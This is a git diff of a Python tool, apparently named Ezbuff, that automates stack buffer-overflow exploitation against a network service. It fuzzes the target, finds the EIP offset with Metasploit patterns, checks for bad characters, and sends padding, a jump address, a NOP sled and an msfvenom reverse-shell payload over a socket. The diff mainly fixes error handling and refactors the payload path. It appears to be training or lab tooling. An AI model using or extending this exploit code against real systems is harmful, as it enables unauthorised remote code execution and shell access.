@@ -4,6 +4,7 @@ try:
 	import logging
 	from re import search
 	from time import sleep
+	from sys import exit
 except ImportError as err:
 	print(f"Import Error: {err}")
 
@@ -53,8 +54,10 @@ class Ezbuff:
 	""" Ezfuzz class definition
 
 	Attributes:
+		nop_sled (str): A raw string of 16 no operation bytes
 		chars (str): All possible characters to test application for bad characters.
 	"""
+	nop_sled = r"\x90"*16
 	chars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
 "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
 "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
@@ -72,10 +75,9 @@ class Ezbuff:
 			_targ_ip (str): Will store the IP of the target machine, default = None
 			_targ_port (int): Will store the port number of the target application, default = None
 			_bad_chars_found (list): Will store the bad character found by the user, default = empty list
-			_nop_sled (str): A string of 16 no operation bytes
 			_offset (int): Will store the integer returned by msf's pattern_offset file
 							that determines where the offset occured in the fuzzing process
-			_num_bytes_crash (int): The number of bytes it took to crash the system
+			_num_bytes_crash (int): The number of bytes it took to crash the system,
 									Note: the bytes are sent in increments of 50
 			_receive_bytes (int): The number of bytes we will receive from the target machine at once
 			_jump_eip (str): Will store the four bytes necessary to overwrite eip register with jump command
@@ -93,15 +95,16 @@ class Ezbuff:
 			if not isinstance(targ_port, int):
 				raise InvalidTargetPortError("The target port number must be an integer between 1-65535")
 		except InvalidTargetIPError as err:
-			print(r + " Invalid Target IP: {err}" + rst)
+			print(r + f" Invalid Target IP: {err}" + rst)
+			exit(1)
 		except InvalidTargetPortError as err:
-			print(r + " Invalid Target Port Error: {err}" + rst)
+			print(r + f" Invalid Target Port Error: {err}" + rst)
+			exit(1)
 		else:
 			self._targ_port = targ_port
 			self._targ_ip = targ_ip
 
 		self._bad_chars_found = []
-		self._nop_sled = r"\x90"*16
 		self._offset = None
 		self._num_bytes_crash = None
 		self._jump_eip = None
@@ -109,7 +112,7 @@ class Ezbuff:
 
 	def __repr__(self):
 		return (f"Ezfuzz(\n\ttarg_ip = '{self.targ_ip}',\n\ttarg_port = {self.targ_port},"
-				f"\n\tnop_sled = {self._nop_sled},\n\tbad_characters = {self._bad_chars_found},"
+				f"\n\tbad_characters = {self._bad_chars_found},"
 				f"\n\toffset = {self._offset},\n\tnum_bytes_crash = {self._num_bytes_crash},"
 				f"\n\tjump_eip = {self._jump_eip}\n)\n")
 
@@ -190,7 +193,7 @@ class Ezbuff:
 		Args:
 			offset (int): The offset returned from the pattern_offset.rb file or set by the user.
 		"""
-		self._offset = offset_int
+		self._offset = offset
 
 
 	@property
@@ -216,7 +219,8 @@ class Ezbuff:
 			if len(jump_mem_location) != 16:
 				raise InvalidMemoryAddressError("The memory address to over the EIP register must be four bytes long.")
 		except InvalidMemoryAddressError as err:
-			print(r+" Invalid Memory Address Error: {err}"+rst)
+			print(r + f" Invalid Memory Address Error: {err}" + rst)
+			exit(1)
 		else:
 			self._jump_eip = jump_mem_location
 
@@ -265,7 +269,7 @@ class Ezbuff:
 					finally:
 						self._num_bytes_crash += 50
 		elif reverse_payload:
-			content  = "A"*self.offset + self.jump_eip + self.nop_sled + reverse_payload
+			content  = "A"*self.offset + self.jump_eip + Ezbuff.nop_sled + reverse_payload
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
 			buff += content
@@ -274,7 +278,8 @@ class Ezbuff:
 				try:
 					soc.send(buff)
 				except OSError as err:
-					print(r + " Socket Error: {err}" + rst)
+					print(r + f" Socket Error: {err}" + rst)
+					exit(1)
 
 		else:
 			content = "A"*self.offset + "B"*4 + chars + "C"*(self._num_bytes_crash-self.offset - 4 - len(Ezbuff.chars))
@@ -286,7 +291,8 @@ class Ezbuff:
 				try:
 					soc.send(buff)
 				except OSError as err:
-					print(r + " Socket Error: {err}" + rst)
+					print(r + f" Socket Error: {err}" + rst)
+					exit(1)
 	
 
 	def send_msf_pattern(self):
@@ -294,7 +300,7 @@ class Ezbuff:
 		"""
 		payload = self._generate_msf_pattern()
 
-		sock = self._create_socket()
+		soc = self._create_socket()
 		with soc:
 			bytes_payload = bytes(payload, "utf-8")
 			print(g + "[+]" + rst + " Sending Msfpattern payload...")
@@ -315,7 +321,7 @@ class Ezbuff:
 			eip_chars (str): The address that overwrote the EIP when program crashed
 		"""
 		output = sp.run(['usr/share/metasploit-framework/tools/pattern_offset.rb'], eip_chars)
-		self.offset(output.stdout)
+		self.offset = output.stdout
 
 
 	def test_offset(self):
@@ -332,6 +338,7 @@ class Ezbuff:
 				raise NoOffsetError("Please run `get_offset` to get and set offset value.")
 		except NoOffsetError as err:
 			print(r + f" NoOffsetError: {err}" + rst)
+			exit(1)
 
 		soc = self._create_socket()
 		with soc:
@@ -354,12 +361,15 @@ class Ezbuff:
 			soc = s.socket(s.AF_INET, s.SOCK_STREAM)
 			soc.connect((self._targ_ip, self._targ_port))
 		except OSError as err:
-			print(r + "OSError: {err}" + rst)
+			print(r + f" OSError: {err}" + rst)
+			exit(1)
 		return soc
 
 
-	def send_reverse(self, payload_file):
-		"""Will send the reverse payload to the obtain a reverse shell.
+	def get_payload(self, payload_file):
+		"""Will retrieve the payload from a generated payload file
+		and invoke the `fuzz` function to send the payload
+		to the target machine.
 
 		Args:
 			payload_file (str): The name of the file containing the payload generated by Msfvenom
